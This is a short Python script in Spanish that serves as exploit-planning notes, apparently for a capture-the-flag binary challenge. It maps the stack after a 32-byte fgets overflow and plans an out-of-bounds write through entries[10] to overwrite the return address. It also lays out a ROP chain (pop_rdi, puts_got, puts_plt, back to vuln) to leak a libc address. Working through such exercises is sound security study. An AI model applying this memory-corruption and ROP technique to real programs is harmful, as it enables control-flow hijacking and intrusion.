#!/usr/bin/env python3
"""
Replanteando el exploit con restricción de 32 bytes

feedback[8] está en rbp-12
fgets lee 32 bytes en feedback

Layout después del overflow:
[0-7]: feedback (rbp-12 a rbp-5)
[8-11]: total_entries (rbp-4 a rbp-1)
[12-19]: saved_rbp (rbp+0 a rbp+7)
[20-27]: return_address (rbp+8 a rbp+15)
[28-31]: siguiente qword parcial (rbp+16 a rbp+19)

Solo puedo controlar 32 bytes totales.
Después de 20 bytes de padding, me quedan 12 bytes.
Con 12 bytes puedo poner 1 dirección completa (8 bytes) + 4 bytes más.

ESTRATEGIA ALTERNATIVA 1: Stack pivoting
- Pivotear el stack a una zona controlada (como entries[])
- En entries[] tengo 10*72 = 720 bytes disponibles

ESTRATEGIA ALTERNATIVA 2: Usar índice negativo
- entries[10].msg está en rbp-8 a rbp+55
- Esto incluye el return address!
- Con índice 10, msg[64] puede escribir 64 bytes desde rbp-8
- Offset del return address desde rbp-8: 8-(-8) = 16 bytes

¡ESTO ES! Usar índice 10 para escribir directamente en el return address
con un ROP chain completo de 64 bytes!
"""

print("ESTRATEGIA CORRECTA:")
print("1. Agregar 11 entradas dummy (para tener valid entries[10])")
print("2. Usar índice 10 para escribir mensaje")
print("3. El msg estará en rbp-8, y puedo escribir 64 bytes")
print("4. Offset 16 del msg es el return address")
print("5. ROP chain completo de 48 bytes disponibles!")
print()
print("ROP chain en entries[10].msg:")
print("  [0-15]: padding hasta return address")
print("  [16-23]: pop_rdi")
print("  [24-31]: puts_got")
print("  [32-39]: puts_plt")
print("  [40-47]: vuln_addr")
print("  [48-63]: más ROP si es necesario")
print()
print("Total: 64 bytes de los cuales 48 son para ROP!")
